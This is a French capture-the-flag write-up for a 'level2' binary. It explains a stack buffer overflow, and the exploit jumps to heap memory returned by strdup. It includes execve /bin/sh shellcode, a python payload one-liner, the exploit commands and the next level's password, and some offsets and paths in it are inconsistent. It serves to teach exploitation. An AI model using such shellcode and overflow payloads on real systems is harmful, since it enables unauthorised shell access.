# Analyse du code

Il y a deux fonctions : main et une autre fonction p(), appelée dans main.
Dans ce programme, nous pouvons provoquer un buffer overflow et y injecter notre payload. Le problème ici est que le buffer se trouve sur la pile (stack), et qu’il y a une condition pour quitter le programme si la valeur de EIP est égale à 0xb.
Pour contourner cela, nous allons rediriger le registre EIP vers le pointeur de strdup, qui se trouve également sur la pile.

# Preparation du payload

- taille buffer :
	Pour atteindre EIP, 90 

- shellcode : (https://shell-storm.org/shellcode/files/shellcode-575.html)
	\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 - 21 bytes

- Retour de strdup
ltrace ./level2 
	fflush(0xb7fd1a20)   = 0
	gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5test) = 0xbffff70c
	puts("test"test)         = 5
	strdup("test")     = 0x0804a008  

- payload :
	python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * (80 - 21) + '\x08\xa0\x04\x08')" > /tmp/
# Exploit

	cat /tmp/_ - | ./level2
	cat  /home/user/level3/.pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02